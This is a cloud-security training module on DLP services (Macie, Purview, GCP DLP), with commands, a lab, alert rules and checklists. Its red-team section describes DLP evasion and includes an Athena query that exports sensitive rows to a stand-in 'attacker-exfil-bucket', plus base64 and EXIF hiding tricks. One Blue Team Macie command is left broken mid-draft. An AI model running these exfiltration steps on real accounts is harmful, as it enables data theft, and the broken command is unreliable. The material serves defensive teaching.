# 09 — DLP for Cloud

> **Level:** Intermediate
> **Prereqs:** [Public Exposure & Block Public Access](public-exposure-and-block-public.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Collection, Exfiltration, Discovery
> **Authorization scope:** Run only in your own sandbox accounts. All DLP scanning targets your own test data. Never scan production data without authorization.

## What & why

Cloud-native Data Loss Prevention (DLP) services — Amazon Macie, Azure Purview / Information Protection, GCP DLP API — automatically discover, classify, and alert on sensitive data (PII, credentials, PHI) stored in object storage, databases, and structured tables. Without DLP, an S3 bucket full of customer passport scans looks exactly like a bucket of cat photos to the infrastructure layer.

## The OnPrem reality

On-prem DLP meant endpoint agents that scanned files on write + network DLP appliances that inspected email/HTTP traffic. Both were notoriously high-friction: endpoint agents caused 20–30% CPU spikes during file scans, network appliances broke TLS inspection, and classification was keyword-regex only (no ML-based entity recognition). Cloud DLP is agentless, scan-on-read, and uses trained ML models for PII classification.

## Core concepts

### DLP detection techniques

| Technique | How it works | Strengths | Weaknesses |
|---|---|---|---|
| Regex / pattern matching | Matches known formats (SSN, credit card, AWS key ID) | Fast, low false positive for structured data | Misses obfuscated data, high FP on random matching |
| ML-based entity recognition | Trained models detect names, addresses, national IDs across formats | Handles unstructured text, multi-language | Higher cost, requires training data |
| Document fingerprinting | Hashes of known-sensitive documents compared to stored data | Detects exact copies of classified docs | Misses partial copies, redacted versions |
| Contextual analysis | Keywords near data fields ("password:", "SSN:", "secret:") | Catches unformatted secrets | Lower precision than structured regex |
| Named entity recognition (NER) | NLP models detect PERSON, LOCATION, ORGANIZATION entities | Works on free-form text | Multi-language support varies |

### Classification tiers

| Tier | Examples | Action on exposure |
|---|---|---|
| PII / Personal | Names, email, phone, address | Alert, auto-remediate if public |
| Financial | Credit card, bank account, tax ID | Block public, immediate alert |
| Health / PHI | Diagnosis codes, patient IDs, medical images | Block public, legal escalation |
| Secrets / Credentials | AWS keys, SSH private keys, API tokens | Auto-revoke + alert CIRT |
| Confidential / IP | Source code, design docs, contracts | Alert, notify data owner |

## AWS — Amazon Macie

Amazon Macie scans S3 buckets using ML to discover and classify sensitive data.

```bash
# Enable Macie in the account
aws macie2 enable-macie

# Create a classification job for a specific bucket
aws macie2 create-classification-job \
  --name "scan-prod-buckets" \
  --s3-job-definition '{
    "bucketDefinitions": [{"accountId": "111111111111", "buckets": ["prod-data-bucket"]}]
  }' \
  --job-type ONE_TIME \
  --sampling-percentage 100

# List findings
aws macie2 list-findings --finding-criteria '{
  "criterion": {"severity.description": {"eq": ["High"]}}
}'

# Get details on a specific finding
aws macie2 get-findings --finding-ids "finding-id-abc123"
```

**Pricing (as of June 2026):**
- $0.10 per GB evaluated (first 1GB/month free)
- $0.01 per automated sensitive data discovery object

**Gotcha:** Macie discovers new S3 buckets automatically but only scans buckets it manages. If you create federated access to a bucket in a different account, Macie may not scan it unless the bucket is also in a managed account.

### Macie findings — automated response

```bash
# Lambda function triggered by Macie finding → auto-remediate
# Example: if PII found in a public bucket, apply block-public-access
aws s3api put-public-access-block \
  --bucket compromised-bucket \
  --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

## Azure — Purview & Information Protection

Azure provides two complementary DLP services: Purview for data governance and classification, and Microsoft Information Protection (MIP) for labeling.

```bash
# Purview — register a data source (Azure Blob Storage)
az purview account create \
  --name purview-instance \
  --resource-group sec-rg \
  --location eastus

# Scan a storage account
az purview scan run \
  --data-source-name "prodblobstorage" \
  --scan-name "full-scan-weekly"

# MIP — auto-labeling policy for documents containing credit card numbers
# Configured via Microsoft 365 Compliance Center (PowerShell)
Connect-IPPSSession
New-AutoSensitivityLabelPolicy \
  -Name "Financial-Data-Auto-Label" \
  -ApplySensitivityLabel "Confidential-Finance" \
  -ExchangeLocation "All"
```

**Pricing (as of June 2026):** Purview is metered by data map capacity units ($0.38/hour) plus scan execution ($1.50 per 1000 assets scanned). MIP is included in E5/G5 licensing.

**Gotcha:** Purview can scan multi-cloud sources (AWS S3 via integration runtime, GCP Cloud Storage via connector) but requires a self-hosted integration runtime (VM) for cross-cloud scanning — it's not agentless for competitor clouds.

## GCP — DLP API

GCP Cloud DLP is the most flexible and API-centric of the three — it can inspect text strings, files in Cloud Storage, BigQuery tables, and streaming data.

```bash
# Inspect a Cloud Storage bucket for PII
gcloud dlp jobs create \
  --project project-id-111111 \
  --inspect-config '{
    "infoTypes": [
      {"name": "CREDIT_CARD_NUMBER"},
      {"name": "US_SOCIAL_SECURITY_NUMBER"},
      {"name": "EMAIL_ADDRESS"}
    ],
    "minLikelihood": "LIKELY"
  }' \
  --storage-config '{
    "cloudStorageOptions": {
      "fileSet": {"url": "gs://prod-data-bucket/*"}
    }
  }'

# Create a job trigger for continuous scanning
gcloud dlp triggers create \
  --project project-id-111111 \
  --display-name "weekly-bucket-scan" \
  --schedule "every 7 days" \
  --inspect-config '{
    "infoTypes": [{"name": "PERSON_NAME"}, {"name": "PHONE_NUMBER"}]
  }' \
  --storage-config-bucket gs://prod-data-bucket

# Check job status
gcloud dlp jobs list --filter="state=DONE" --limit 5
```

**Pricing (as of June 2026):**
- Inspection: $1.00 per GB scanned (inspection jobs)
- Discovery: $0.50 per GB processed (profiling)
- De-identification: $1.00 per GB transformed

**Gotcha:** GCP DLP API has a hard limit of 10MB per individual file for synchronous inspection. Use asynchronous jobs (the `gcloud dlp jobs create` command above) for files larger than 10MB or bulk scanning.

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| DLP engine | Endpoint + network agents | Macie (S3 only) | Purview + MIP | Cloud DLP API |
| Classification type | Regex + fingerprint | ML + regex + custom identifiers | ML + regex + trainable classifiers | ML + regex + custom infoTypes |
| Scanned sources | File servers, email, endpoints | S3 buckets | Blob Storage, SQL DB, multi-cloud | Cloud Storage, BigQuery, Datastore, text strings |
| Agent requirement | Yes (endpoint + network) | No (agentless) | No (agentless, except for multi-cloud IR) | No (agentless) |
| Auto-remediation | Manual or SOAR playbook | Macie → Lambda → block-public | Purview → Logic App → block | DLP → Pub/Sub → Cloud Function |
| Multi-cloud coverage | N/A | No (AWS only) | Via integration runtime (preview) | Via Storage Transfer Service |

## 🔴 Red Team view

Attackers use ML classification evasion to exfiltrate sensitive data that would be caught by naive regex but passes ML detectors.

### Technique 1 — Chunking and encoding

Macie/Purview/DLP detect PII like email addresses in structured text. An attacker base64-encodes the sensitive data before exfiltration, then decodes it on the other side:

```bash
# Attacker splits sensitive data and encodes it
echo "user@example.com:SSN-123-45-6789:CC-4111-1111-1111-1111" | base64 > /tmp/exfil-data.txt
# The file now contains: "dXNlckBleGFtcGxlLmNvbTpTU04tMTIzLTQ1LTY3ODk6Q0MtNDExMS0xMTExLTExMTEtMTExMQo="
# Macie regex no longer matches email/SSN/CC patterns
```

### Technique 2 — Exfiltration via DLP-safe channels

If DLP only scans S3/Blob/Cloud Storage but not database query results or streaming logs, attackers exfiltrate data via those unmonitored paths:

```bash
# Attacker reads sensitive data via Athena queries (not scanned by Macie)
aws athena start-query-execution \
  --query-string "SELECT * FROM sensitive_data LIMIT 100000" \
  --result-configuration "OutputLocation=s3://attacker-exfil-bucket/"
# Macie only scans the source bucket, not Athena query results
```

### Technique 3 — Data format obfuscation

Sensitive data stored in formats DLP parsers struggle with:

```bash
# PII embedded in images (EXIF metadata, steganography)
exiftool -Comment="SSN:123-45-6789 CC:4111-1111-1111-1111" photo.jpg
# Macie image analysis is limited to OCR of text in images — EXIF metadata may be missed
```

### Technique 4 — Gradual exfiltration below DLP thresholds

Many DLP tools generate findings above a minimum record count (e.g., 100+ email addresses). An attacker exfiltrates 50 records per day for 30 days — never triggering the bulk-finding threshold but moving 1,500 records total.

**Artifacts left:** S3 access logs show repeated small-scale GET operations from an unusual IP. CloudTrail records the `GetObject` calls. The pattern of small, daily data reads is a detection signal even without DLP.

## 🔵 Blue Team view

### Automated DLP scan scheduling

**AWS Macie — scheduled classification jobs:**
```bash
# Weekly scan of all S3 buckets tagged with 'data-classification=pii'
aws macie2 create-classification-job \
  --name "weekly-pii-scan" \
  --job-type SCHEDULED \
  --schedule-frequency '{"dailySchedule": {}}' -- no, use custom
# Note: Macie scheduled jobs are managed via console or CloudFormation
```

**Azure Purview — scheduled scans:**
```bash
az purview scan create \
  --data-source-name prodblobstorage \
  --scan-name weekly-full-scan \
  --scan-ruleset-name "PII-Detection-Rules"

az purview trigger create \
  --data-source-name prodblobstorage \
  --scan-name weekly-full-scan \
  --recurrence "Week" \
  --interval 1
```

**GCP DLP — job triggers for continuous scanning:**
```bash
gcloud dlp triggers create \
  --project project-id-111111 \
  --display-name "daily-pii-bucket-scan" \
  --schedule "every 24 hours" \
  --inspect-config-file inspect-config.json \
  --storage-config-bucket gs://prod-data-bucket
```

### SIEM integration

| Cloud | DLP → SIEM path |
|---|---|
| AWS | Macie → EventBridge → Lambda → S3 (JSON) → SIEM ingestion (Splunk/Sentinel/Elastic) |
| Azure | Purview → Event Hub → Sentinel native connector |
| GCP | DLP → Pub/Sub → Cloud Function → Cloud Logging → Chronicle / external SIEM |

### Alerting rules

```yaml
# Cloud Custodian — alert on Macie finding with severity High
policies:
  - name: macie-high-severity-pii
    resource: macie-finding
    filters:
      - type: value
        key: severity.description
        value: High
    actions:
      - type: notify
        template: macie-high-severity.j2
        to:
          - security-team@example.com
```

### DLP coverage gap analysis

Checklist to run quarterly:
- [ ] All S3 buckets / Blob Storage / Cloud Storage with public access have DLP scanning enabled.
- [ ] Buckets with `prod` tag are scanned weekly (not just once).
- [ ] DLP coverage includes backups, log archives, and CI/CD artifact stores.
- [ ] Test DLP detection: upload a file with a synthetic credit card number — verify alert fires within 24 hours.
- [ ] Cross-account/cross-project bucket access is included in DLP scope.

## Hands-on lab

1. Enable Amazon Macie (free tier: 30-day trial, 1GB/month free):
```bash
aws macie2 enable-macie
```

2. Create a test S3 bucket with a "public" object containing synthetic PII:
```bash
aws s3 mb s3://macie-test-bucket-111111111111
cat > test-data.json << 'EOF'
{
  "users": [
    {"name": "Test User", "email": "test.user@example.com", "ssn": "123-45-6789", "cc": "4111-1111-1111-1111"}
  ]
}
EOF
aws s3 cp test-data.json s3://macie-test-bucket-111111111111/
```

3. Run a Macie classification job:
```bash
aws macie2 create-classification-job \
  --name "lab-pii-scan" \
  --s3-job-definition '{"bucketDefinitions":[{"accountId":"111111111111","buckets":["macie-test-bucket-111111111111"]}]}' \
  --job-type ONE_TIME \
  --sampling-percentage 100
```

4. Check findings after the job completes (wait ~10 minutes):
```bash
aws macie2 list-findings
aws macie2 get-findings --finding-ids <finding-id>
```

**Teardown:**
```bash
aws s3 rb s3://macie-test-bucket-111111111111 --force
aws macie2 disable-macie
rm test-data.json
```

## Detection rules & checklists

**EventBridge rule — Macie finding → SNS alert:**
```json
{
  "source": ["aws.macie"],
  "detail-type": ["Macie Finding"],
  "detail": {
    "severity": {"description": ["High", "Critical"]}
  }
}
```

**Checklist:**
- [ ] DLP enabled on all buckets/containers storing customer data.
- [ ] DLP scan schedule: PII buckets weekly, non-PII monthly, new buckets immediately.
- [ ] Auto-remediation enabled for public buckets with sensitive data findings.
- [ ] DLP alerts integrated into SIEM with severity-based routing (High → PagerDuty, Low → Jira).
- [ ] Quarterly DLP coverage gap analysis completed.
- [ ] Synthetic PII test file deposited quarterly to verify end-to-end alert pipeline.

## References
- [Amazon Macie User Guide](https://docs.aws.amazon.com/macie/latest/user/what-is-macie.html)
- [Azure Purview Documentation](https://learn.microsoft.com/en-us/azure/purview/overview)
- [Microsoft Information Protection](https://learn.microsoft.com/en-us/microsoft-365/compliance/information-protection)
- [GCP Cloud DLP Documentation](https://cloud.google.com/dlp/docs)
- [MITRE ATT&CK — Automated Collection (T1119)](https://attack.mitre.org/techniques/T1119/)
- [MITRE ATT&CK — Exfiltration Over Web Service (T1567)](https://attack.mitre.org/techniques/T1567/)
